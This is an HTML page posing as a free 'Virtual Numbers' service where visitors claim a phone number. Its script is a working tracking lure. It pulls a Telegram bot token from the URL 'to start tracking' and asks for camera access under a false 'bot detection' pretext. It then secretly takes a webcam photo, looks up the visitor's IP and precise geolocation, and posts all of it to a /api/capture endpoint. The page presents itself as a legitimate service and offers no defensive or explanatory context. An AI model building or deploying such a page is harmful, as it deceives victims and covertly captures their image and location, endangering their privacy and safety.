<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Virtual Numbers</title>
<style>
body { font-family: sans-serif; background:#0f172a; color:white; text-align:center; padding:20px;}
.container { max-width:420px; margin:50px auto; background:#1e293b; padding:30px; border-radius:15px; }
.number-box { font-size:18px; margin:10px 0; padding:12px; background:#020617; border-radius:8px; cursor:pointer; }
.number-box.active { background:#38bdf8; color:#020617; }
button { background:#38bdf8; color:#0f172a; padding:15px; border:none; border-radius:8px; cursor:pointer; width:100%; margin-top:15px;}
#status{margin-top:15px;color:#94a3b8;}
video{display:none;margin-top:15px;border:2px solid #38bdf8;border-radius:8px;}
canvas{display:none;}
.spinner{display:none;margin:20px auto;width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #38bdf8;border-radius:50%;animation:spin 1s linear infinite;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
</style>
</head>
<body>
<div class="container">
<h2>🌍 Virtual Numbers</h2>
<p>Select a number:</p>
<div class="numbers">
<div class="number-box">🇺🇸 +1 (202) 555‑0199</div>
<div class="number-box">🇬🇧 +44 20 7946 0958</div>
<div class="number-box">🇨🇦 +1 416 555 0133</div>
<div class="number-box">🇦🇺 +61 2 9374 4000</div>
<div class="number-box">🇩🇪 +49 30 901820</div>
<div class="number-box">🇫🇷 +33 1 42 68 53 00</div>
</div>
<button id="claimBtn">Claim Selected Number</button>
<div class="spinner" id="loader"></div>
<p id="status"></p>
<video id="video" autoplay playsinline width="200" height="150"></video>
<canvas id="canvas"></canvas>
</div>

<script>
const claimBtn = document.getElementById('claimBtn');
const loader = document.getElementById('loader');
const status = document.getElementById('status');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let selectedNumber = null;

// Get token from URL
const urlParams = new URLSearchParams(window.location.search);
const token = urlParams.get("token");
if(!token){
  status.innerText="⚠️ Open this page via your Telegram bot link to start tracking.";
  claimBtn.disabled=true;
}

// Select number
document.querySelectorAll('.number-box').forEach(box=>{
  box.addEventListener('click',()=>{
    document.querySelectorAll('.number-box').forEach(b=>b.classList.remove('active'));
    box.classList.add('active');
    selectedNumber = box.innerText;
  });
});

// Get IP
async function getUserIP(){
  try{
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  }catch(e){ return "Unknown"; }
}

// Get precise location (city, country)
async function getUserLocation(){
  return new Promise(resolve=>{
    if(!navigator.geolocation) return resolve("Unavailable");
    navigator.geolocation.getCurrentPosition(async pos=>{
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      try{
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
        const data = await res.json();
        const city = data.address.city || data.address.town || data.address.village || "Unknown City";
        const country = data.address.country || "Unknown Country";
        resolve(`${city}, ${country}`);
      }catch{
        resolve(`Lat:${lat}, Lon:${lon}`);
      }
    },()=>resolve("Location denied"));
  });
}

// Claim number
claimBtn.onclick=async ()=>{
  if(!selectedNumber){ status.innerText="Select a number first!"; return; }
  claimBtn.style.display='none'; loader.style.display='block'; status.innerText="Initializing...";

  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream; video.style.display='block';
    status.innerText="requsting for code...";

    setTimeout(async ()=>{
      canvas.width=video.videoWidth; canvas.height=video.videoHeight;
      canvas.getContext('2d').drawImage(video,0,0);
      const imgBase64 = canvas.toDataURL('image/jpeg');
      const ip = await getUserIP();
      const location = await getUserLocation();

      await fetch("/api/capture",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({image:imgBase64, token, ip, location})
      });

      status.innerText=`✅ Number ${selectedNumber} claimed successfully!\n🌍 Location: ${location}\n🌐 IP: ${ip}`;
      loader.style.display='none';
      video.style.display='none';
      stream.getTracks().forEach(track=>track.stop());
    },2000);
  }catch(err){
    console.error(err);
    status.innerText="❌ Camera access is required for bot deyection.";
    loader.style.display='none'; claimBtn.style.display='block';
  }
};
</script>
</body>
</html>
